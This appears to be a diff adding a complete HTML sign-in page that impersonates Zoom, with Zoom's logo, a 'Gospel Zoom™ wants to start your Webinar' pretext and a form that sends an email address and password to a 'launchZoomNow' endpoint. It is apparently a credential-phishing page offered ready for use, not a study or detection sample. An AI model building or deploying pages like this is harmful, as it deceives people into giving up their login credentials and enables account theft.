@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="signIn-css.css">
+    <title>Sign In - Zoom</title>
+    <style>
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    font-family: 'Lato','Helvetica','Arial';
+    font-size: 13px;
+    color: rgb(120, 120, 120);
+    overflow: hidden;
+}
+.logo {
+    width: auto;
+    height: 100%;
+}
+.header {
+    padding: 13px;
+    height: 24px;
+    width: 100%;
+    border-bottom: solid rgb(231, 231, 231);
+    border-bottom-width: 1px;
+    position: relative;
+}
+.header-link {
+    color: #2073D9;
+    position: absolute;
+    top: 50%;
+    -ms-transform: translateY(-50%);
+    transform: translateY(-50%);
+    font-size: 12px;
+    font-weight: 500;
+}
+#body {
+    padding: 15px;
+}
+#title {
+    font-size: 24px;
+    color: #595959;
+    font-weight: 400;
+}
+.formInput {
+    margin-top: 8px;
+    width: calc(100% - 20px);
+    border-radius: 7px;
+    padding: 10px;
+    border: 1px solid rgb(120, 120, 120);
+}
+input:focus {
+    outline: none;
+    border: 1px solid #739CD9;
+}
+l {
+    color: rgb(14, 113, 235)
+}
+#submit {
+    border: none;
+    background-color: rgb(14,113,235);
+    color: white;
+    width: 100%;
+    border-radius: 7px;
+    padding: 12px;
+    font-size: 16px;
+}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img class="logo" src="https://st1.zoom.us/static/6.1.5948/image/new/ZoomLogo.png" alt="Zoom Logo">
+        <a class="header-link" style="right:80px">HOST</a>
+        <a class="header-link" style="right:140px">JOIN</a>
+        <a class="header-link" style="right:50px; font-size: 20px; font-weight: 100;">
+            <i class="fa fa-bars"></i>
+        </a>
+    </div>
+    <div id="body">
+        <a id="title">Sign In</a>
+        <div style="height: 5px;"></div>
+        <a>Gospel Zoom&trade; wants to start your Webinar</a>
+        <br><br>
+        <hr style="
+        border: none;
+        background-color: rgb(231, 231, 231);
+        height: 1px">
+        <br>
+        <form action="launchZoomNow" method="get">
+            <label for="email">Email Address</label>
+            <input class="formInput" name="email" type="text" placeholder="Email Address">
+            <br><br><br>
+            <label for="password">Password</label>
+            <input class="formInput" name="password" type="password" placeholder="Password">
+    
+            <br><br><br>
+            <a>By signing in, I agree to the <l>Zoom's Privacy Statement</l> and <l>Terms of Service.</l></a>
+            <br><br>
+            <input id="submit" type="submit" value="Sign In">
+        </form>
+    </div>
+</body>
+</html>
